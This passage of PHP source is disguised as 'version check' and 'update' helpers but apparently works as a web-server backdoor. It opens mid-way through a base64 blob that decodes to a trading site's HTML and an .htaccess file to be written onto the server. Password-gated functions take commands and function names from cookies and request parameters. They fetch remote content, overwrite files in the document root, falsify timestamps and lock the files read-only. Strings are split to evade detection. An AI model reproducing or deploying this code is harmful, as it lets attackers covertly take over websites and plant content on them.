b2Nlc3NfX3RpdGxlIj5PcGVuIGFjY291bnQ8L3NwYW4+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX3N1YnRpdGxlIj5GaWxsIGluIHlvdXIgZGV0YWlscyBoZXJlIHRvIHNldHVwIHlvdXIgYWNjb3VudC48L3NwYW4+CgkJCQkJCQkJCQk8L2xpPgoKCQkJCQkJCQkJCTxsaSBjbGFzcz0icHJvY2Vzc19faXRlbSI+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX251bWJlciI+MDI8L3NwYW4+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX3RpdGxlIj5WZXJpZmljYXRpb248L3NwYW4+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX3N1YnRpdGxlIj5WZXJpZnkgeW91ciBpbmZvcm1hdGlvbiB0byBwcm90ZWN0IHlvdXIgY29udGFjdC48L3NwYW4+CgkJCQkJCQkJCQk8L2xpPgoKCQkJCQkJCQkJCTxsaSBjbGFzcz0icHJvY2Vzc19faXRlbSI+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX251bWJlciI+MDM8L3NwYW4+CgkJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InByb2Nlc3NfX3RpdGxlIj5EZXBvc2l0IGZ1bmRzPC9zcGFuPgoJCQkJCQkJCQkJCTxzcGFuIGNsYXNzPSJwcm9jZXNzX19zdWJ0aXRsZSI+RGVwb3NpdCBmdW5kcyB0byBpbml0aWF0IGJhbGFuY2UgaW4geW91ciBhY2NvdW50Ljwvc3Bhbj4KCQkJCQkJCQkJCTwvbGk+CgoJCQkJCQkJCQkJPGxpIGNsYXNzPSJwcm9jZXNzX19pdGVtIj4KCQkJCQkJCQkJCQk8c3BhbiBjbGFzcz0icHJvY2Vzc19fbnVtYmVyIj4wNDwvc3Bhbj4KCQkJCQkJCQkJCQk8c3BhbiBjbGFzcz0icHJvY2Vzc19fdGl0bGUiPlN0YXJ0IHRyYWRpbmd0PC9zcGFuPgoJCQkJCQkJCQkJCTxzcGFuIGNsYXNzPSJwcm9jZXNzX19zdWJ0aXRsZSI+V2l0aCBoZWxwIG9mIHJlbGFibGUgZmVhdHVyZXMgZ2V0IHRoZSBiZXN0IG91dCBvZiB5b3VyIHRyYWRpbmcuPC9zcGFuPgoJCQkJCQkJCQkJPC9saT4KCQkJCQkJCQkJPC91bD4KCQkJCQkJCQkJCgkJCQkJCQkJCQoJCQkJCQkJCQkKCQkJCQkJCQkJCgkJCQkJCQkJCQoJCQkJCQkJCQkKCQkJCQkJCQkJCgkJCQkJCQkJCQoJCQkJCQkJCTwvZGl2PgoJCQkJCQkJPC9kaXY+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCQk8IS0tQXdhcmRzLS0+CgkJCTwhLS1TZWN0aW9uLS0+CgkJCTxkaXYgY2xhc3M9InZsdC1zZWN0aW9uIHBwLXNjcm9sbGFibGUiIGRhdGEtYW5jaG9yPSJUcmFkaW5nLUV4cGVyaWVuY2UiIGRhdGEtYnJpZ2h0bmVzcz0ibGlnaHQiPgoJCQkJPGRpdiBjbGFzcz0idmx0LXNlY3Rpb25fX3ZlcnRpY2FsLWFsaWduIj4KCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtc2VjdGlvbl9fY29udGVudCI+CgkJCQkJCTwhLS1QYXJ0aWNsZXMtLT4KCQkJCQkJPGRpdiBjbGFzcz0idmx0LXNlY3Rpb25fX3BhcnRpY2xlcyI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtcGFydGljbGUgdmx0LWN1c3RvbS0tMTI1OSB2bHQtZmFkZS1pbi1yaWdodCIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybCgvYXNzZXRzL2ltZy9yb290L3BsdXMtbGlnaHQtcGF0dGVybi5wbmcpOyBhbmltYXRpb24tZGVsYXk6IDc1MG1zOyI+PC9kaXY+CgkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtcGFydGljbGUgdmx0LWN1c3RvbS0tMjM1NSB2bHQtZmFkZS1pbi1sZWZ0IiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC9hc3NldHMvaW1nL3Jvb3QvZWxpcHNlLWxpZ2h0LnBuZyk7IGFuaW1hdGlvbi1kZWxheTogNTAwbXM7Ij48L2Rpdj4KCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0aWNsZSB0cmFkZS1pbWctcmlnaHQgdmx0LWZhZGUtaW4tcmlnaHQiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoL2Fzc2V0cy9pbWcvc2hhcmUtbWFya2V0LnBuZyk7Ij48L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCQkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb2wtbGctNiI+CgkJCQkJCQkJCTxkaXYgY2xhc3M9InRyYWRlLWV4cGVyaWVuY2UiIHN0eWxlPSJhbmltYXRpb24tZGVsYXk6MHM7IGFuaW1hdGlvbi1kdXJhdGlvbjo3MDBtczsiPgoJCQkJCQkJCQkJPGgyIGNsYXNzPSJzdWItdGl0bGUiPk1lZXQgdGhlIGhpZ2hlc3Qgc3RhbmRhcmRzIG9mIDxzcGFuIGNsYXNzPSJoYXMtZmlyc3QtY29sb3IiPnRyYWRpbmcgZXhwZXJpZW5jZS48L3NwYW4+PC9oMj4KCQkJCQkJCQkJCTxwPk1pbGxpb25zIG9mIGNsaWVudHMgaGF2ZSB0cnVzdGVkIFRyYWRlYnVsbCBmb3IgaXRzIGZsZXhpYmlsaXR5LCBpbi1kZXB0aCBpbnNpZ2h0LCBhbmQgbWFya2V0IHJlc2VhcmNoLiBUcmFkZXJzIGFyb3VuZCB0aGUgd29ybGQgcmVseSBvbiB1cyBmb3IgRm9yZXggVHJhZGluZywgU3RvY2sgSW5kaWNlcyBUcmFkaW5nLCBDb21tb2RpdHkgVHJhZGluZywgU3RvY2tzLCBNZXRhbHMsIGFuZCBFbmVyZ2llcyBUcmFkaW5nLjwvcD4KCgkJCQkJCQkJCQk8dWwgY2xhc3M9Im1lbnUtbGlzdCI+CgkJCQkJCQkJCQkgICA8bGk+TGljZW5zZWQgYW5kIFJlZ3VsYXRlZCBCcm9rZXI8L2xpPgoJCQkJCQkJCQkJICAgPGxpPlRydXN0ZWQgYnJva2VyIHdpdGggMTArIHllYXJzIG9mIGV4cGVyaWVuY2UgPC9saT4KCQkJCQkJCQkJCSAgIDxsaT5UcmFkZSB3aXRoIG92ZXIgMTAwMCsgSW5zdHJ1bWVudHM8L2xpPgoJCQkJCQkJCQkJPC91bD4KCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQoJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTUwIj48L2Rpdj4KCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCTwvZGl2PgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJPCEtLVRlc3RpbW9uaWFscy0tPgoJCQkKCQkJPCEtLVNlY3Rpb24tLT4KCQkJPGRpdiBjbGFzcz0idmx0LXNlY3Rpb24gcHAtc2Nyb2xsYWJsZSIgZGF0YS1hbmNob3I9IkNvbnRhY3QiIGRhdGEtYnJpZ2h0bmVzcz0iZGFyayIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IGxpbmVhci1ncmFkaWVudCh0byByaWdodCB0b3AsIHJnYig3LCA1NiwgMTU3KSwgcmdiKDUsIDY1LCAxODUpLCByZ2IoMTQsIDczLCAxODUpLCByZ2IoMzcsIDEwNiwgMjI2KSwgcmdiKDQxLCAxMTgsIDI0NCkpOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDBweCwgMHB4LCAwcHgpOyI+CgkJCQk8ZGl2IGNsYXNzPSJ2bHQtc2VjdGlvbl9fdmVydGljYWwtYWxpZ24iPgoJCQkJCTxkaXYgY2xhc3M9InZsdC1zZWN0aW9uX19jb250ZW50Ij4KCQkJCQkJPCEtLUtlbiBCdXJuIEVmZmVjdC0tPgoJCQkJCQkKCQkJCQkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCQkJCTxkaXYgY2xhc3M9InJvdyI+CgkJCQkJCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIGNvbC1tZC0xMiBjb2wtc20tMTIiPgoJCQkJCQkJCTxkaXYgY2xhc3M9ImZvb3Rlci1ib3hlcyI+CgkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1hbmltYXRlZC1ibG9jayBmb290ZXItbGlzdCIgc3R5bGU9ImFuaW1hdGlvbi1kZWxheTowczsgYW5pbWF0aW9uLWR1cmF0aW9uOjcwMG1zOyI+CgkJCQkJCQkJCQkKCQkJCQkJCQkJCTxoND4gQ29udGFjdCBEZXRhaWxzPC9oND4KCQkJCQkJCQkJCTxkaXYgY2xhc3M9ImNvbnRhY3QtYm94Ij4KCQkJCQkJCQkJCQk8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNHB4IiBmaWxsPSIjMjE1ZmNmIj48cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiPjwvcGF0aD48cGF0aCBkPSJNMTIgMkM4LjEzIDIgNSA1LjEzIDUgOWMwIDUuMjUgNyAxMyA3IDEzczctNy43NSA3LTEzYzAtMy44Ny0zLjEzLTctNy03ek03IDljMC0yLjc2IDIuMjQtNSA1LTVzNSAyLjI0IDUgNWMwIDIuODgtMi44OCA3LjE5LTUgOS44OEM5LjkyIDE2LjIxIDcgMTEuODUgNyA5eiI+PC9wYXRoPjxjaXJjbGUgY3g9IjEyIiBjeT0iOSIgcj0iMi41Ij48L2NpcmNsZT48L3N2Zz4KCQkJCQkJCQkJCQk8YSBocmVmPSIjIj4xMzAgT2xkIFN0cmVldCwgTG9uZG9uLCBFbmdsYW5kLCBFQzFWIDlCRDwvYT4KCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJPGRpdiBjbGFzcz0iY29udGFjdC1ib3giPgoJCQkJCQkJCQkJCTxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBoZWlnaHQ9IjI0cHgiIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0cHgiIGZpbGw9IiMyMTVmY2YiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMFYweiIgZmlsbD0ibm9uZSI+PC9wYXRoPjxwYXRoIGQ9Ik0yMiA2YzAtMS4xLS45LTItMi0ySDRjLTEuMSAwLTIgLjktMiAydjEyYzAgMS4xLjkgMiAyIDJoMTZjMS4xIDAgMi0uOSAyLTJWNnptLTIgMGwtOCA1LTgtNWgxNnptMCAxMkg0VjhsOCA1IDgtNXYxMHoiPjwvcGF0aD48L3N2Zz4KCQkJCQkJCQkJCQk8YSBocmVmPSJtYWlsdG86b3BlcmF0aW9uc0B0cmFkZWJ1bGxmeC5jb20iPm9wZXJhdGlvbnNAdHJhZGVidWxsZnguY29tPC9hPgoJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250YWN0LWJveCI+CgkJCQkJCQkJCQkJPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjRweCIgdmlld0JveD0iMCAwIDI0IDI0IiB3aWR0aD0iMjRweCIgZmlsbD0iIzIxNWZjZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIj48L3BhdGg+PHBhdGggZD0iTTYuNTQgNWMuMDYuODkuMjEgMS43Ni40NSAyLjU5bC0xLjIgMS4yYy0uNDEtMS4yLS42Ny0yLjQ3LS43Ni0zLjc5aDEuNTFtOS44NiAxMi4wMmMuODUuMjQgMS43Mi4zOSAyLjYuNDV2MS40OWMtMS4zMi0uMDktMi41OS0uMzUtMy44LS43NWwxLjItMS4xOU03LjUgM0g0Yy0uNTUgMC0xIC40NS0xIDEgMCA5LjM5IDcuNjEgMTcgMTcgMTcgLjU1IDAgMS0uNDUgMS0xdi0zLjQ5YzAtLjU1LS40NS0xLTEtMS0xLjI0IDAtMi40NS0uMi0zLjU3LS41Ny0uMS0uMDQtLjIxLS4wNS0uMzEtLjA1LS4yNiAwLS41MS4xLS43MS4yOWwtMi4yIDIuMmMtMi44My0xLjQ1LTUuMTUtMy43Ni02LjU5LTYuNTlsMi4yLTIuMmMuMjgtLjI4LjM2LS42Ny4yNS0xLjAyQzguNyA2LjQ1IDguNSA1LjI1IDguNSA0YzAtLjU1LS40NS0xLTEtMXoiPjwvcGF0aD48L3N2Zz4KCQkJCQkJCQkJCQk8YSBocmVmPSJ0ZWw6Kzc5MjgxMDEyMzQ1Ij4rNDQxMTMzMjA0NzEyPC9hPgoJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTIwIj48L2Rpdj4KCQkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1hbmltYXRlZC1ibG9jayAiIHN0eWxlPSJhbmltYXRpb24tZGVsYXk6MHM7IGFuaW1hdGlvbi1kdXJhdGlvbjo3MDBtczsiPgoJCQkJCQkJCQkJCTxoND4gU3Vic2NyaWJlIHRvIG91ciBuZXdzbGV0dGVyPC9oND4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJuZXdzbGV0dGVyIj4KCQkJCQkJCQkJCQkJPGlucHV0IHR5cGU9IiIgbmFtZT0iZW1haWwiIHZhbHVlPSIiIHBsYWNlaG9sZGVyPSJFbWFpbCBBZGRyZXNzIj4KCQkJCQkJCQkJCQkJPGltZyBzcmM9ImFzc2V0cy9pbWcvcmlnaHQtYXJyb3ctYW5nbGUucG5nIiAvPgoJCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkKCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIGZvb3Rlci1saXN0IiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjBzOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCTxoND4gTWVudQk8L2g0PgoJCQkJCQkJCQkJPHVsPgoJCQkJCQkJCQkJCTxsaT48YSBocmVmPSJodHRwczovL3RyYWRlYnVsbC5pbyI+IEhvbWU8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iL2Fib3V0Ij4gQWJvdXQ8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iL2Rvd25sb2FkIj4gRG93bmxvYWQ8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iIj4gQWNjb3VudHM8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iIj4gVHJhZGluZyBQcm9kdWN0czwvYT48L2xpPgoJCQkJCQkJCQkJCTxsaT48YSBocmVmPSIiPiBQYXJ0bmVyc2hpcDwvYT48L2xpPgoJCQkJCQkJCQkJCTxsaT48YSBocmVmPSIvY29udGFjdCI+IENvbnRhY3QgVXM8L2E+PC9saT4KCQkJCQkJCQkJCTwvdWw+CgkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkKCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIGZvb3Rlci1saXN0IiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjBzOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCTxoND4gU2VydmljZXM8L2g0PgoJCQkJCQkJCQkJPHVsPgoJCQkJCQkJCQkJCTxsaT48YSBocmVmPSIiPiBFbWFpbCBNYXJrZXRpbmc8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iIj4gQ2FtcGFpZ25zPC9hPjwvbGk+CgkJCQkJCQkJCQkJPGxpPjxhIGhyZWY9IiI+IEJyYW5kaW5nPC9hPjwvbGk+CgkJCQkJCQkJCQkJPGxpPjxhIGhyZWY9IiI+IE9mZmxpbmU8L2E+PC9saT4KCQkJCQkJCQkJCTwvdWw+CgkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkKCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIGZvb3Rlci1saXN0IiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjBzOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCTxoND4gSGVscDwvaDQ+CgkJCQkJCQkJCQk8dWw+CgkJCQkJCQkJCQkJPGxpPjxhIGhyZWY9IiI+IEZBUXM8L2E+PC9saT4KCQkJCQkJCQkJCQk8bGk+PGEgaHJlZj0iL2NvbnRhY3QiPiBDb250YWN0IFVzPC9hPjwvbGk+CgkJCQkJCQkJCQk8L3VsPgoJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJCgkJCQkJCQkJCTwhLS0gPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIGZvb3Rlci1saXN0IiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjBzOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCTxoND4gUGF5bWVudCBPcHRpb25zPC9oND4KCQkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0bmVyLWxvZ28iIHN0eWxlPSJoZWlnaHQ6NzVweDsiPjxpbWcgc3JjPSJhc3NldHMvaW1nL2xvZ29zLnBuZyIgYWx0PSJwYXltZW50IG9wdGlvbnMiPjwvZGl2PgoJCQkJCQkJCQk8L2Rpdj4gLS0+CgkJCQkJCQkJCQoJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTcwLS1zbSI+PC9kaXY+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJCTwhLS1Qcm9ncmVzcyBCYXItLT4KCQkJPHVsIGNsYXNzPSJ2bHQtZnVsbHBhZ2Utc2xpZGVyLXByb2dyZXNzLWJhciI+CgkJCQk8bGkgZGF0YS1tZW51YW5jaG9yPSJIb21lIj48L2xpPgoJCQkJPGxpIGRhdGEtbWVudWFuY2hvcj0iU2VydmljZXMiPjwvbGk+CgkJCQk8bGkgZGF0YS1tZW51YW5jaG9yPSJNRVRBLVRSQURFUiI+PC9saT4KCQkJCTxsaSBkYXRhLW1lbnVhbmNob3I9IlRyYWRpbmciPjwvbGk+CgkJCQk8bGkgZGF0YS1tZW51YW5jaG9yPSJHZXQtc3RhcnRlZCI+PC9saT4KCQkJCTxsaSBkYXRhLW1lbnVhbmNob3I9IlRyYWRpbmctRXhwZXJpZW5jZSI+PC9saT4KCQkJCTwhLS08bGkgZGF0YS1tZW51YW5jaG9yPSJUZXN0aW1vbmlhbHMiPjwvbGk+CgkJCQk8bGkgZGF0YS1tZW51YW5jaG9yPSJDZXJ0ZWZpY2F0aW9uIj48L2xpPi0tPgoJCQkJPGxpIGRhdGEtbWVudWFuY2hvcj0iQ29udGFjdCI+PC9saT4gCgkJCTwvdWw+CgkJCQoJCQkKCQkJCgkJCTwhLS1OdW1iZXJzLS0+CgkJCQoJCTwvZGl2PgoJPC9tYWluPgoJPCEtLUxpYnMtLT4KCTxzY3JpcHQgc3JjPSIvYXNzZXRzL3ZlbmRvcnMvanF1ZXJ5LTMuNS4xLm1pbi5qcyI+PC9zY3JpcHQ+Cgk8c2NyaXB0IHNyYz0iL2Fzc2V0cy9zY3JpcHRzL3ZsdC1wbHVnaW5zLm1pbi5qcyI+PC9zY3JpcHQ+Cgk8c2NyaXB0IHNyYz0iL2Fzc2V0cy9zY3JpcHRzL3ZsdC1oZWxwZXJzLmpzIj48L3NjcmlwdD4KCQoJPHNjcmlwdCBzcmM9Ii9hc3NldHMvc2NyaXB0cy92bHQtY29udHJvbGxlcjIubWluLmpzIj48L3NjcmlwdD4KCQoJCgkKCTxzY3JpcHQ+CgkJJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKSB7CgkJCSQoJyNjbG9zZScpLm9uKCdjbGljaycsIGZ1bmN0aW9uKGUpIHsgCgkJCQkkKCcudmx0LW9mZmNhbnZhcy1tZW51JykuY3NzKCd0cmFuc2Zvcm0nLCAndHJhbnNsYXRlKDEwMCUsIDBweCknKSA7CgkJCX0pOwoJCQkkKCcjY2xvc2UnKS5vbignY2xpY2snLCBmdW5jdGlvbihlKSB7IAoJCQkJJCgnLnZsdC1zaXRlLW92ZXJsYXknKS5jc3MoJ3RyYW5zZm9ybScsICd0cmFuc2xhdGUoMTAwJSwgMHB4KScpIDsKCQkJfSk7CgkJCQoJCQkkKCcudmx0LW1lbnUtYnVyZ2VyICcpLm9uKCdjbGljaycsIGZ1bmN0aW9uKGUpIHsgCgkJCQkkKCcudmx0LW9mZmNhbnZhcy1tZW51JykuY3NzKCd0cmFuc2Zvcm0nLCAndHJhbnNsYXRlKDBweCwgMHB4KScpIDsKCQkJfSk7CgkJCSQoJy52bHQtbWVudS1idXJnZXIgJykub24oJ2NsaWNrJywgZnVuY3Rpb24oZSkgeyAKCQkJCSQoJy52bHQtc2l0ZS1vdmVybGF5JykuY3NzKCd0cmFuc2Zvcm0nLCAndHJhbnNsYXRlKDBweCwgMHB4KScpIDsKCQkJfSk7CgkJCQoJCQkKCQl9KTsgICAKCQkKCQoJPC9zY3JpcHQ+CjwvYm9keT4KCgo8L2h0bWw+IjtpOjI7czozMjoiNDBjYjdkMzFhYzA5N2E4MDZiN2JkNWU1OTk1NWJmYTgiO31pOjE7YTozOntpOjA7czozODoiL2hvbWUzL21hc3RldG5yL3RyYWRlYnVsbC5pby8uaHRhY2Nlc3MiO2k6MTtzOjIwNDoiPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+IjtpOjI7czozMjoiYmU0NzZkMjdlY2U4OTU5NDYwNGQxNDg4NmMwODEwMTYiO319', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("hnstijcq{$check}gbawq", '208285d589fe360e631d0273efa8e91b')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}